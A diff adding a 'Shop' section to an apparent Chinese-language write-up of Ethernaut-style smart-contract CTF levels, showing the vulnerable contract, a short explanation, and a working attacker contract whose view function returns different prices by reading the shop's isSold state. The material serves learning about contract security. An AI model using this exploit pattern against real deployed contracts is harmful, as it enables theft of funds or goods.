@@ -1250,3 +1250,50 @@ contract Attack {
 ```js
 await contract.setWithdrawPartner("0x096fb29B3474Fe58D8da00d52EAB27eF9b75Bb02")
 ```
+
+# Shop
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Buyer {
+    function price() external view returns (uint256);
+}
+
+contract Shop {
+    uint256 public price = 100;
+    bool public isSold;
+
+    function buy() public {
+        Buyer _buyer = Buyer(msg.sender);
+
+        if (_buyer.price() >= price && !isSold) {
+            isSold = true;
+            price = _buyer.price();
+        }
+    }
+}
+```
+这个和之前做过的题有点像，第一次返回一个大于price的值，第二次返回一个小的值。但这个题和之前的不同的一点是函数是 view 修饰的。view 不能修改合约状态。所以看起来不能用之前的思路做了？但是 Buyer 合约可以反过来查询 Shop 的 isSold 状态，这样 buyer 就没有进行任何修改也可以改变 flag。
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+interface IShop {
+    function isSold() external view returns (bool);
+    function buy() external;
+}
+
+
+contract Buyer {
+    IShop shop = IShop(0x9543f67A97E33b4209CCBfe92A0370D98E1E3245);
+
+    function price() public view returns (uint256) {
+        if (shop.isSold()) return 1;
+        else return 100;
+    } 
+
+    function attack() public {
+        shop.buy();
+    }
+}
+```
